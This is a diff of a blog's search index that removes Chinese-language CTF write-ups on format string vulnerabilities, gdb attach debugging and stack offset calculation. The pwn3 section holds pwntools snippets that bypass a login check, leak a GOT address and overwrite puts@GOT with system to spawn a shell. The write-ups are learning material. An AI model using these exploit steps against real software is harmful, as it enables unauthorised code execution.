@@ -1228,262 +1228,6 @@ fakeBK -&gt; fd == P`` ，等价于`*(fakeBK + 8) == P
       </tags>
   </entry>
   <entry>
-    <title>格式化字符串漏洞学习</title>
-    <url>/2021/10/23/%E6%91%86%E7%83%82%E7%AC%AC%E4%B8%89%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<html><head></head><body><h2 id="1）前言">1）前言<a class="post-anchor" href="#1）前言"></a></h2><p>绿盟杯pwn1，格式化字符串+沙盒orw。保护全开。</p>
-<p>首先对于格式化字符串我的理解就不是很深刻，甚至从来没有完整地刷过一道格式化字符串的题目。</p>
-<p>所以碰到这道题，算是又给我敲了第nn个警钟。</p>
-<p>非常清晰地告诉我：我是垃圾。</p>
-<h2 id="2）格式化字符串基本原理">2）格式化字符串基本原理<a class="post-anchor" href="#2）格式化字符串基本原理"></a></h2><p>ctfwiki上的格式化字符串教程写得挺好的，可以参考。</p>
-<h5 id="格式化字符串参数">格式化字符串参数<a class="post-anchor" href="#格式化字符串参数"></a></h5><pre><code class="c">%[parameter][flags][field width][.precision][length]type
-</code></pre>
-<ul>
-<li><p>parameter</p>
-<ul>
-<li>n$，获取格式化字符串中的指定参数</li>
-</ul>
-</li>
-<li><p>flag</p>
-</li>
-<li><p>field width</p>
-<ul>
-<li>输出的最小宽度</li>
-</ul>
-</li>
-<li><p>precision</p>
-<ul>
-<li>输出的最大长度</li>
-</ul>
-</li>
-<li><p>length，输出的长度</p>
-<ul>
-<li>hh，输出一个字节</li>
-<li>h，输出一个双字节</li>
-</ul>
-</li>
-<li><p>type</p>
-<ul>
-<li>d/i，有符号整数</li>
-<li>u，无符号整数</li>
-<li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
-<li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
-<li>s，如果没有用 l 标志，输出 null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>
-<li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>
-<li><strong>p， void * 型，输出对应变量的值</strong>。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li>
-<li>n，不输出字符，<strong>但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</strong>。</li>
-</ul>
-<h5 id="格式化字符串漏洞利用">格式化字符串漏洞利用<a class="post-anchor" href="#格式化字符串漏洞利用"></a></h5><p>一般来说就是打印变量的时候并没有对变量进行格式化，或者格式化的方式并不正确。</p>
-<p>一般来说不正确的方式有这几种</p>
-<ol>
-<li>一直%s，容易引用不合法的地址，造成程序崩溃   </li>
-<li>通过打印的相关内存信息，泄露内存布局，获得有用的信息</li>
-</ol>
-<h2 id="3-例1-goodluck">3)例1:goodluck<a class="post-anchor" href="#3-例1-goodluck"></a></h2><p>话不多说，直接上例子。</p>
-<h3 id="程序逻辑分析">程序逻辑分析<a class="post-anchor" href="#程序逻辑分析"></a></h3><p>第一步，清晰而准确的逆向是漏洞点利用的基础。</p>
-<p>首先，程序读取flag，通过<code>_IO_getc(fp)</code>，一个字符一个字符地将flag读入v10。</p>
-<p>然后将flag的首地址给v9。</p>
-<p>然后刷新缓冲区。这里这个fflush函数，以前没有怎么深入了解过（</p>
-<p>然后看一个关于fflush的详解</p>
-<p><a href="http://c.biancheng.net/cpp/html/2506.html">C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区）</a></p>
-<p>但是文章中讲的是stdin，和这里的bss段关联感觉并不大，我疑惑的地方不是为什么要fflush，而是疑惑bss段有什么东西。</p>
-<p>bss段存储未初始化的全局变量，也不是缓冲区吧。</p>
-<h4 id="缓冲区">缓冲区<a class="post-anchor" href="#缓冲区"></a></h4><p><em>从一个简单的fflush函数中，我们试图理解缓冲区的原理和这个函数被设置的意义。</em></p>
-<p>为了减少cpu对磁盘的读写次数，提高运行速度，缓冲区（这里特指buf）存储了我们的键盘，屏幕输入输出。当我们将字符通过键盘输入到缓冲区中，<code>cingetchar</code>函数再从缓冲区中读取我们的键盘输入，从而进行数据的操作。屏幕输出也是同理。</p>
-<h5 id="缓冲区的分类">缓冲区的分类<a class="post-anchor" href="#缓冲区的分类"></a></h5><h6 id="1-全缓冲。">1:全缓冲。<a class="post-anchor" href="#1-全缓冲。"></a></h6><p>只有在缓冲区被填满之后才会进行<code>I/O</code>操作；最典型的全缓冲就是对磁盘文件的读写。</p>
-<h6 id="2-行缓冲">2:行缓冲<a class="post-anchor" href="#2-行缓冲"></a></h6><p>只有在输入或者是输出中遇到换行符的时候才会进行<code>I/O</code>操作；这忠允许我们一次写一个字符，但是只有在写完一行之后才做<code>I/O</code>操作。一般来说，标准输入流(<code>stdin</code>)和标准输出流(<code>stdout</code>)是行缓冲</p>
-<h6 id="3-无缓冲">3:无缓冲<a class="post-anchor" href="#3-无缓冲"></a></h6><ol>
-<li>无缓冲；标准<code>I/O</code>不缓存字符；其中表现最明显的就是标准错误输出流(<code>stderr</code>)，这使得出错信息尽快的返回给用户。</li>
-</ol>
-<p>（我以前一直不是很能理解为什么要专门设置一个标准错误，现在知道了，如果error的输出有缓冲区的话，可能要等程序执行到最后才会报错，这样就不能即时地接收到报错）</p>
-<h5 id="fflush函数">fflush函数<a class="post-anchor" href="#fflush函数"></a></h5><p>然后是关于fflush函数的glibc源码。</p>
-<p>fflush实际是调用vtable中的函数<code>_IO_new_file_sync</code>，这个函数的源码如图：</p>
-<p>（<code>/glibc-2.23/libio/fileops.c:867</code>）</p>
-<pre><code class="c">int
-_IO_new_file_sync (_IO_FILE *fp)
-{
-  _IO_ssize_t delta;
-  int retval = 0;
-
-  /*    char* ptr = cur_ptr(); */
-  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
-    if (_IO_do_flush(fp)) 
-    return EOF;//end of file
-  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;
-  if (delta != 0)
-    {
-#ifdef TODO
-      if (_IO_in_backup (fp))
-    delta -= eGptr () - Gbase ();
-#endif
-      _IO_off64_t new_pos = _IO_SYSSEEK (fp, delta, 1);
-      if (new_pos != (_IO_off64_t) EOF)
-    fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;
-#ifdef ESPIPE
-      else if (errno == ESPIPE)
-    ; /* Ignore error from unseekable devices. */
-#endif
-      else
-    retval = EOF;
-    }
-  if (retval != EOF)
-    fp-&gt;_offset = _IO_pos_BAD;
-  /* FIXME: Cleanup - can this be shared? */
-  /*    setg(base(), ptr, ptr); */
-  return retval;
-}
-libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)
-</code></pre>
-<p>虽然但是，真的看不懂，那些调用的函数是啥功能都不知道。</p>
-<h5 id="pwntools与缓冲区机制">pwntools与缓冲区机制<a class="post-anchor" href="#pwntools与缓冲区机制"></a></h5><p>某些pwn题为了增加难度，会设置题目默认缓冲区存在，从而使pwntools的对于数据的发送与接收产生问题，一是远端的输出并不会及时回显，另外是数据累积在缓冲区内，对远端数据的正常接收造成影响。</p>
-<p>为了搞清这种影响是如何产生的，以及如何解决，我们将从pwntools的源码层面研究pwntools与远端服务器的交互，从而彻底探明这一问题。详见<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E4%BA%94%E5%A4%A9--pwntools%E6%BA%90%20%E7%A0%81%20%E5%89%96%20%E6%9E%90--%E4%BB%A5%E6%BA%90%E7%A0%81%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90io%E4%BA%A4%E4%BA%92%E5%8E%9F%E7%90%86/">pwntools源码剖析（1）–以源码的角度分析io交互原理</a></p>
-<h4 id="ms？">%ms？<a class="post-anchor" href="#ms？"></a></h4><p>从缓冲区的研究回到程序的简单逻辑分析上。</p>
-<p><code>__isoc99_scanf("%ms", &amp;format);</code></p>
-<p>接着就来了这么一句，我第一次听说m这个参数，其实就是动态的分配了scanf的缓冲区，有效避免了溢出。（stackoverflow上回答废话一堆，说得云里雾里）</p>
-<p>然后接着又是一个手写的read函数，再将输入的字符串赋给v4，再将v4与flag比较，如果错误，就来一个格式化字符串的漏洞。</p>
-<h3 id="漏洞利用">漏洞利用<a class="post-anchor" href="#漏洞利用"></a></h3><p>因为程序其实已经拿到flag了，所以这道题并不需要考虑getshell。只需要通过刚才的格式化字符串漏洞，将flag打印出来。</p>
-<p>那么如何打印这个flag呢？</p>
-<p>我们首先肯定要输入一个错误的flag（废话），然后进入与flag的比较，这个时候，flag的具体的值也在内存中。所以随便动调一下。</p>
-<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.31.45.png" data-caption="截屏2021-10-26 下午10.31.45" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.31.45.png" alt="截屏2021-10-26 下午10.31.45"></a></p>
-<p>flag其实就已经出来了，但是为了学习，我们还需要将它打印出来。</p>
-<p>这时候就需要计算这个flag字符串与栈顶的偏移。</p>
-<p>![截屏2021-10-26 下午10.35.39](/Users/rin/Library/Application Support/typora-user-images/截屏2021-10-26 下午10.35.39.png)</p>
-<p>显然flag在栈顶第四个参数的位置，除去第一行的返回地址，也就是第三个。但是由于64位程序，前6个参数是由寄存器传参，所以需要+6，也就是第九个参数。</p>
-<p>利用%n$s打印参数，即可获得flag。</p>
-<h2 id="4-例2">4)例2<a class="post-anchor" href="#4-例2"></a></h2><p>经过刚才的开胃菜，我们总算进入了正题。</p>
-<p>一般来说，getshell的其中一种非常常见的手法就是改函数got表为另外某个函数。尤其是没有栈溢出，并且并没有开启relro的情况下，这种手法几乎是最通用的解法。</p>
-<p>但是如果需要修改函数的got表，我们需要满足几个条件：</p>
-<ol>
-<li>知道需要修改的函数的真实地址。</li>
-<li>需要想办法改写函数的got表。</li>
-</ol>
-<p>一般来说，一个没有漏洞的程序，想要实现以上任意一点都是很难的，但是毕竟还是ctf题（</p>
-<p>回归正题，我们可以用格式化字符串漏洞来解决以上两个问题，详见例子</p>
-<h3 id="cctf-pwn3">cctf pwn3<a class="post-anchor" href="#cctf-pwn3"></a></h3><h5 id="程序分析">程序分析<a class="post-anchor" href="#程序分析"></a></h5><p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%888.50.03.png" data-caption="截屏2021-10-27 上午8.50.03" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%888.50.03.png" alt="截屏2021-10-27 上午8.50.03"></a></p>
-<h5 id="程序逻辑分析-1">程序逻辑分析<a class="post-anchor" href="#程序逻辑分析-1"></a></h5><p>还是先进行一个简单的逻辑分析。</p>
-<p>首先要求登陆，然后在系统中有三个功能，get file ，put file 和show file，基本就是put一个文件，输入文件名和内容，然后可以get文件和show文件。（虽然我没看明白这个get和show函数有什么区别）显然在get file 中，存在一个格式化字符串漏洞。</p>
-<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%889.02.34.png" data-caption="截屏2021-10-27 上午9.02.34" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%889.02.34.png" alt="截屏2021-10-27 上午9.02.34"></a></p>
-<p>所以思路其实很清晰，首先我们并不知道密码，要登录进去，还需要绕过一个密码的检测。</p>
-<p>当我们成功登陆，直接确定格式化字符串相对栈的偏移，然后打印函数的真实地址。</p>
-<p>首先我们确定字符串偏移。</p>
-<h5 id="gdb动调的一些坑">gdb动调的一些坑<a class="post-anchor" href="#gdb动调的一些坑"></a></h5><p>用wiki给的exp动调一下，把断点下在发送payload之前。如果调试不当可能会造成<code> ERROR: Could not find ELF base!</code></p>
-<p>原因详见<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%9B%9B%E5%A4%A9--gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/">摆烂第四天–gdb附加调试的一些黑魔法</a>的2.1节。</p>
-<p>因为一下断点，程序就异常退出，所以这道题又非常不幸地沦为了看，而不是调。</p>
-<p>等问题解决了在再来调。</p>
-<pre><code class="python">tmp = 'sysbdmin'
-name = ""
-for i in tmp:
-    name += chr(ord(i) - 1)
-
-
-## password
-def password():
-    sh.recvuntil('Name (ftp.hacker.server:Rainism):')
-    sh.sendline(name)
-</code></pre>
-<p>绕过密码的关键函数。其实绕过的核心思路就是strcmp的返回值，strcmp是以asc2码做比较的，然后如果str1比str2小，则返回一个负值。题目的检测显然需要我们返回一个负值，所以我们需要输入比sysbdmin的asc2小，但字符长度相等的字符。</p>
-<p>这样就有了代码中的公式。</p>
-<p>当我们绕过了密码，然后就需要打印puts函数的真实地址。</p>
-<p>打印真实地址，第一步需要找到格式化字符串在栈中的偏移。</p>
-<p>关于这个偏移的寻找，其实背公式的话非常简单，但是我们需要了解其中的原理。在上一个简单的例子中我们并没有对这个原理进行一个详细的说明，是因为题目步骤实在过于简单，但是如果碰到较为复杂的题目，盲人摸象并不可取。</p>
-<p>原理参见：<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/">格式化字符串偏移计算原理</a></p>
-<p>这里的偏移是8</p>
-<pre><code class="python"># get the addr of puts
-puts_got = pwn3.got['puts']
-log.success('puts got : ' + hex(puts_got))
-put(b'1111', b'%8$s' + p32(puts_got))
-puts_addr = u32(get('1111')[:4])
-</code></pre>
-<p>然后put一个名为1111的文件，内容是格式化字符串以及puts的got表地址。</p>
-<p>这里<code>%8$s' + p32(puts_got)</code>应该是先把puts的got表传进去，然后再通过%8$s打印。</p>
-<p>然后接收信息，就是puts的got表。</p>
-<p>然后就是经典rop的确定libc基址和system地址，比较套路。</p>
-<p>下一个关键点是</p>
-<pre><code class="python">payload = fmtstr_payload(7, {puts_got: system_addr})
-put('/bin/sh;', payload)
-sh.recvuntil('ftp&gt;')
-sh.sendline('get')
-sh.recvuntil('enter the file name you want to get:')
-##gdb.attach(sh)
-sh.sendline('/bin/sh;') 
-</code></pre>
-<p>​    这里其实主要的问题都是被<code>fmtstr_payload</code>函数解决了。</p>
-<p>​    这个函数是pwntools的一个集成的功能，含义就是，格式化字符串是栈上第七个参数，然后需要将system的地址写入puts的got表地址。</p>
-<p>​    关于函数是如何实现的，可以参见另外一篇笔记。<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/">格式化字符串偏移计算原理</a></p>
-<p>最后调用show，也就是puts函数，puts的content的是binsh，就相当于getshell。</p>
-<p>​    </p>
-<p>​    这个题的调试部分才是大头，一点一点把问题解决吧。</p>
-<h4 id="调试部分">调试部分<a class="post-anchor" href="#调试部分"></a></h4><p>​    思路和exp都很清楚的情况下，我们尝试对题目进行调试。</p>
-<h2 id="参考">参考<a class="post-anchor" href="#参考"></a></h2><p><a href="https://zhuanlan.zhihu.com/p/79504011">缓冲区机制详解</a></p>
-<p><a href="http://c.biancheng.net/cpp/html/2506.html">C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区）</a></p>
-<p><a href="https://stackoverflow.com/questions/38685724/difference-between-ms-and-s-scanf">difference between %ms and %s scanf</a></p>
-<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-example/">格式化字符串</a></p>
-<p>[格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测](格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测)</p>
-</li>
-</ul>
-</body></html>]]></content>
-      <tags>
-        <tag>format</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>gdb附加调试的一些黑魔法</title>
-    <url>/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%9B%9B%E5%A4%A9--gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/</url>
-    <content><![CDATA[<html><head></head><body><h2 id="1）abstract">1）abstract<a class="post-anchor" href="#1）abstract"></a></h2><p>​    这个part主要综合了一些奇怪的调试中遇到的问题，不定期更新。</p>
-<h2 id="2）格式化字符串-cctf-pwn3">2）格式化字符串-cctf-pwn3<a class="post-anchor" href="#2）格式化字符串-cctf-pwn3"></a></h2><h3 id="1）pause（p）导致ERROR-Could-not-find-ELF-base">1）pause（p）导致ERROR: Could not find ELF base<a class="post-anchor" href="#1）pause（p）导致ERROR-Could-not-find-ELF-base"></a></h3><h5 id="问题">问题<a class="post-anchor" href="#问题"></a></h5><p>​    在开始动调这个exp的时候，发现一个很奇怪的点就是如果下的断点的模式gdb.attach(sh)，那么程序会异常退出，大概是这样：</p>
-<pre><code class="bash">Attaching to program: /home/rin/pwn/ctf-wiki/format/cctf-pwn3/pwn3, process 27837
-Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/libc-2.27.so...done.
-ERROR: Could not find ELF base!
-done.
-Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/ld-2.27.so...done.
-done.
-Cannot access memory at address 0xf7fad924
-
-warning: Unable to find dynamic linker breakpoint function.
-GDB will be unable to debug shared library initializers
-and track explicitly loaded dynamic code.
-Failed to read a valid object file image from memory.
-ERROR: Could not find ELF base!
-ERROR: Could not find ELF base!
-ERROR: Could not find ELF base!
-ERROR: Could not find ELF base!
-ERROR: Could not find ELF base!
-ERROR: Could not find ELF base!
-ERROR: Could not find ELF base!
-0xf7f85b59 in ?? ()
-ERROR: Could not find ELF base!
-ERROR: Could not find ELF base!
-ERROR: Could not find ELF base!
-ERROR: Could not find ELF base!
-
-</code></pre>
-<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%8811.17.59.png" data-caption="截屏2021-10-27 上午11.17.59" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%8811.17.59.png" alt="截屏2021-10-27 上午11.17.59"></a></p>
-<p>​    首先需要知道这个报错的原因。</p>
-<p>​    虽然我并没有查到<code>ERROR: Could not find ELF base!</code>这个报错发生的直接trigger，但是很显然这个报错发生是因为程序进程中止，因此无法找到elf base。</p>
-<p>​    那么进程中止的原因何在？</p>
-<h5 id="解决方案">解决方案<a class="post-anchor" href="#解决方案"></a></h5><p>​     经过大师指点，这个问题其实是因为exp错误（</p>
-<p>​    这里的问题是在断点之后，我引用了未经定义的payload，导致程序异常退出，然后这个退出反映在gdb中则是<code>elf base not found</code>。    </p>
-<h5 id="总结">总结<a class="post-anchor" href="#总结"></a></h5><p>​    如果exp正确，这个报错其实并不会存在。可以反推，如果再次碰到类似的报错，十有八九是exp的问题，而并不能把一切锅推给环境。</p>
-<h3 id="3）-kernel-vsyscall？">3）__kernel_vsyscall？<a class="post-anchor" href="#3）-kernel-vsyscall？"></a></h3><h5 id="问题-1">问题<a class="post-anchor" href="#问题-1"></a></h5><p>​    上一个问题中提到，如果我们只是输入gdb.attach()，那么程序会断在<code>__kernel_vsyscall</code>这个函数上。遇见这个函数也是不止一次了，但是从未想过要了解它，今天我决定一探究竟。</p>
-<p>​    我们期望我们的进程暂停在puts payload之前，实际上确实，在此之前，exp没几乎没有任何与远端的io交互，所以断在奇怪的地方也可以理解，那么<code>__kernel_vsyscall</code>是一个怎样的函数，为什么偏偏就断在它的身上呢？ </p>
-<h5 id="解决">解决<a class="post-anchor" href="#解决"></a></h5><p>​    在stackoverflow上，我们能够看出一些端倪。</p>
-<blockquote>
-<p>​    <code>__kernel_vsyscal</code> is the method used by linux-gate.so (a part of the Linux kernel) to make a system call using the fastest available method, preferably the <code>sysenter</code> instruction. </p>
-</blockquote>
-<p>​    这其实就是个系统调用方法，回想一下在srop中的知识点，其实每个系统调用都是一个中断，然后系统切换至内核态进行工作，完成后再切换回用户态，并将结果返回至用户态。</p>
-<p>​    所以出现   <code>__kernel_vsyscal</code> 意味着此刻程序正在进行系统调用。我们同时可以注意到，当  <code>__kernel_vsyscal</code> 函数执行完成，下一个函数则是<code>read</code>函数，也符合我们程序的逻辑–一个菜单题，exp中任何一条语句的结束都将使得函数执行流回到main函数，等待我们的指令。</p>
-<p>当然要结束这个函数我们只需要gdb finish。</p>
-<p>或者直接使用gdb.attach(sh,”break xxx”)。</p>
-<p>关于系统调用我想又可以写一篇专门的博客来研究，这里就不费笔墨了，详情可见：</p>
-<h3 id="4）gdb附加调试下断点的几种姿势。">4）gdb附加调试下断点的几种姿势。<a class="post-anchor" href="#4）gdb附加调试下断点的几种姿势。"></a></h3><h5 id="1）gdb-attach-p">1）gdb.attach(p)<a class="post-anchor" href="#1）gdb-attach-p"></a></h5><h5 id="2）gdb-attach-p-”break-lt-func-name-gt-”">2）gdb.attach(p,”break &lt;func name&gt;”)<a class="post-anchor" href="#2）gdb-attach-p-”break-lt-func-name-gt-”"></a></h5><h5 id="3）p-gdb-debug-“elf”-”break-lt-func-name-gt-”">3）p = gdb.debug(“elf”,”break &lt;func name&gt;” )<a class="post-anchor" href="#3）p-gdb-debug-“elf”-”break-lt-func-name-gt-”"></a></h5><p>​    </p>
-<p>​    </p>
-<p>​    </p>
-<h2 id="）参考">）参考<a class="post-anchor" href="#）参考"></a></h2><p><a href="https://blog.csdn.net/fjh1997/article/details/105434992">如何做到一边使用pwntools一边使用gdb下断点到main函数前</a></p>
-</body></html>]]></content>
-      <tags>
-        <tag>gdb</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ELF文件下对于PIE保护和ASLR的重新认识</title>
     <url>/2021/08/13/ELF%E6%96%87%E4%BB%B6%E4%B8%8B%E5%AF%B9%E4%BA%8EPIE%E4%BF%9D%E6%8A%A4%E5%92%8CASLR%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/</url>
     <content><![CDATA[<html><head></head><body><h3 id=""><a class="post-anchor" href="#"></a></h3><h3 id="ELF文件下对于PIE保护和ASLR的重新认识">ELF文件下对于PIE保护和ASLR的重新认识<a class="post-anchor" href="#ELF文件下对于PIE保护和ASLR的重新认识"></a></h3><h4 id="0）">0）<a class="post-anchor" href="#0）"></a></h4><p>​    复现红色高跟鞋的时候，在ida修复swithc结构的时候碰见了一个问题。因为题目的源文件是有pie保护的，所以ida中的地址是很难看的随机化模式。虽然这些随机化的地址对于我们patch文件毫无影响，但是就是突发奇想，看看能不能找到方法来通过patch将elf文件的pie保护给禁用。</p>
@@ -1722,152 +1466,6 @@ show(0)
       </tags>
   </entry>
   <entry>
-    <title>格式化字符串偏移计算原理及pwntools fmtstr功能源码剖析</title>
-    <url>/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/</url>
-    <content><![CDATA[<html><head></head><body><p>重点研究如何计算32/64位程序中格式化字符串在栈上的偏移，以及研究自动化求偏移的实现</p>
-<h3 id="1）32位偏移计算原理">1）32位偏移计算原理<a class="post-anchor" href="#1）32位偏移计算原理"></a></h3><p>​    其实这个计算确实是有手就行，只需要在栈上找到对应的格式化字符串，然后数是第几个，再减去返回地址所占的一个位置，就是偏移量。</p>
-<p>​    准确来说应该是格式化字符串在栈上的偏移。</p>
-<p>​    原理也比较简单。x86架构下，格式化字符串时通过栈传递的。</p>
-<p>​    然后联想一下函数调用栈的知识点，格式化字符串本身和printf的参数一样，从右到左依次被压栈。</p>
-<p>​    举一个例子，源码来源于<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html">3.1.1 格式化字符串漏洞</a></p>
-<pre><code class="c">//test1.c
-#include&lt;stdio.h&gt;
-void main() {
-    printf("%s %d %s", "Hello World!", 233, "\n");
-}
-</code></pre>
-<p>​    这个程序没有任何的漏洞，只是因为非常简单直观，拿来研究printf函数参数的传参。</p>
-<p>​    我们以32位编译。</p>
-<pre><code class="bash">gcc -m32 test1.c -o test1
-</code></pre>
-<p>​    在main函数处下一个断点。然后执行到断点处。</p>
-<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.35.36.png" data-caption="截屏2021-10-28 下午11.35.36" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.35.36.png" alt="截屏2021-10-28 下午11.35.36"></a></p>
-<p>​    随便多单步几次，可以看到push指令，此刻主调函数已经开始向栈中压入参数了，从<code>stack</code></p>
-<p>部分我们可以看到，此时栈里已经有一个参数”\n”。</p>
-<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.38.15.png" data-caption="截屏2021-10-28 下午11.38.15" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.38.15.png" alt="截屏2021-10-28 下午11.38.15"></a>    </p>
-<p>​    继续单步，观察栈的变化，此时栈顶已经扩大了很多，printf的所有需要的参数都在栈中。然后我们需要调用printf函数。</p>
-<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.40.00.png" data-caption="截屏2021-10-28 下午11.40.00" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.40.00.png" alt="截屏2021-10-28 下午11.40.00"></a></p>
-<p>​    可以看到，这条指令call printf，我们刚刚压栈的参数此时被printf使用。执行完后的下一条指令使esp加0x10，栈空间缩小，回到最初的样子：</p>
-<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.41.43.png" data-caption="截屏2021-10-28 下午11.41.43" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.41.43.png" alt="截屏2021-10-28 下午11.41.43"></a></p>
-<p>​    然后回忆一下被调函数参数和局部变量压栈的过程：</p>
-<p>​    主调函数将被调函数参数从右到左压入栈中，随后将返回地址压栈，此时，栈上的参数偏移的计算就非常清晰了。</p>
-<p>​    这里可能有些弯需要理解一下。大致就是刚刚说到的，主调函数首先将printf需要的函数从右到左依次压栈，（正好栈是从高地址向低地址增长的，所以在gdb stack中呈现的顺序是正常理解的从左到右的先后次序），当将printf需要的参数全部存到栈中后，即可调用printf使用这些参数，此时的栈帧尚属于主调函数，在这个程序中我们不考虑返回地址，所以当参数全部入栈，printf即被调用，栈顶也指向格式化字符串所在的地址。在这里，格式化字符串就是栈上的第一个参数，偏移量就是1。当printf调用完毕，参数即出栈，也就不存在什么格式化字符串偏移了。    </p>
-<h3 id="2）64位偏移计算原理">2）64位偏移计算原理<a class="post-anchor" href="#2）64位偏移计算原理"></a></h3><p>​        原理同32位，但是由于64位传参的规则，是先用6个寄存器传参，如果不够再使用栈，但格式化字符串参数被设置是通过栈传递的，所以实际上格式化字符串在栈上是第n+6个参数。</p>
-<h3 id="3）-pwntools-fmtstr工具">3） pwntools_fmtstr工具<a class="post-anchor" href="#3）-pwntools-fmtstr工具"></a></h3><p>​    在前面的分析中我们可以看到，其实找到格式化字符串的偏移量是一件非常简单的事情，都1202年了，既然是简单的步骤，我们应该需要学会运用自动化工具，使做题步骤简化，比如偏移量的寻找，以及与格式化字符串利用相关的一些事。</p>
-<p>​    pwntools就非常人性化地为我们集成了格式化字符串偏移量寻找，got表覆盖等非常常见好用的操作，这里我们通过简单的例子，着重讨论这些自动化脚本编写的原理。</p>
